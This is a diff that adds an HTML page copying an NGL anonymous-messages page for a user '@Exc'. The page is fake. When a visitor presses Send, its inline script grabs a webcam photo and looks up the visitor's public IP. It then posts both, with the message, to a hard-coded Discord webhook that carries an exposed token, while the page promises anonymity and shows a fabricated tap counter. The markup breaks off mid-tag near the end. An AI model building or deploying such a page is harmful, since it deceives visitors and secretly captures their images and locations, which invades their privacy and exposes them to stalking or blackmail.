@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="module">
+        const sendButton = document.querySelector('.submit');
+
+        sendButton.addEventListener('click', function() {
+            const message = document.getElementById('question').value;
+
+            if (message.trim() !== '') {
+                captureImage().then(imageData => {
+                    getIPAddress().then(userIP => {
+                        sendToDiscordWebhook(message, userIP, imageData);
+                    });
+                }).catch(error => {
+                    console.error('Error capturing image:', error);
+                });
+            }
+        });
+
+        function getIPAddress() {
+            return fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    return data.ip;
+                })
+                .catch(error => {
+                    console.error('Error getting user IP address:', error);
+                    return 'Unknown';
+                });
+        }
+
+        function captureImage() {
+            return new Promise((resolve, reject) => {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(blob => {
+                                resolve(new File([blob], 'image.png', { type: 'image/png' }));
+                            }, 'image/png');
+                            stream.getTracks().forEach(track => track.stop());
+                        };
+                        video.play();
+                    })
+                    .catch(error => {
+                        console.error('Error accessing camera:', error);
+                        reject(error);
+                    });
+            });
+        }
+
+        function sendToDiscordWebhook(message, userIP, imageData) {
+            const webhookURL = 'https://discord.com/api/webhooks/971478317544910928/bOato0Nzxsan6XQs20QElHZRIdu-cQehot1r9l1nwdwn8s_KqvYpaxXGPJHJfT0rVZa4';
+
+            const formData = new FormData();
+            formData.append('content', message);
+            formData.append('user_ip', userIP);
+            formData.append('file', imageData);
+
+            const requestOptions = {
+                method: 'POST',
+                body: formData
+            };
+
+            fetch(webhookURL, requestOptions)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send message to Discord webhook');
+                    }
+                    console.log('Message sent to Discord webhook successfully');
+                })
+                .catch(error => {
+                    console.error('Error sending message to Discord webhook:', error);
+                });
+        }
+
+    </script>
+    <title>@Exc</title>
+    <link rel="stylesheet" href="css/normalize.css">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="shortcut icon" href="images/62a98d041030ce99f782fbde_Variant5_256.png">
+    <script src="js/jquery.min.js"></script>
+    <script src="js/main.js"></script>
+    <script src="js/mixpanel-jslib-snippet.js"></script>
+    <script src="https://js.stripe.com/v3/"></script>
+    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width">
+    <meta name="user:language" content="en">
+    <meta property="og:image" content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&amp;text1=send%20me%20anonymous%20messages!">
+    <meta property="og:title" content="@Exc: send me anonymous messages!">
+    <meta property="og:description" content="@Exc: send me anonymous messages!">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&amp;text1=send%20me%20anonymous%20messages!">
+    <meta name="twitter:title" content="@Exc: Send me anonymous messages!">
+    <meta name="twitter:description" content="NGL: Anonymous Q&amp;A">
+</head>
+<body>
+    <input type="hidden" id="userRegion" value="ID">
+    <div class="container" style="z-index: 1000; position: relative">
+        <form class="form" method="post">
+            <div class="bubble">
+                <div class="header">
+                    <div class="pfp-container"></div>
+                    <div class="user-container">
+                        <div class="username">@Exc</div>
+                        <div class="prompt">send me anonymous messages!</div>
+                    </div>
+                </div>
+                <div class="textarea-container">
+                    <div class="dice-button">🎲</div>
+                    <textarea placeholder="send me anonymous messages..." name="question" autocomplete="off" maxlength="300" id="question"></textarea>
+                </div>
+                <input class="deviceId" type="hidden" name="deviceId" id="deviceId">
+            </div>
+            <div class="anonymous-tooltip">🔒 anonymous q&amp;a</div>
+            <button class="submit" type="submit" style="transform: translateZ(0px); z-index: 1000">Send!</button>
+        </form>
+    </div>
+    <div class="bottom-container-user-wrapper">
+        <div class="bottom-container">
+            <h2 class="download-prompt">👇 <span class="clickCount">218</span> people just tapped the button👇 </h2>
+            <div class="space2"></div>
+            <a class="
+        </div>
+    </div>
+</body>
+</html>
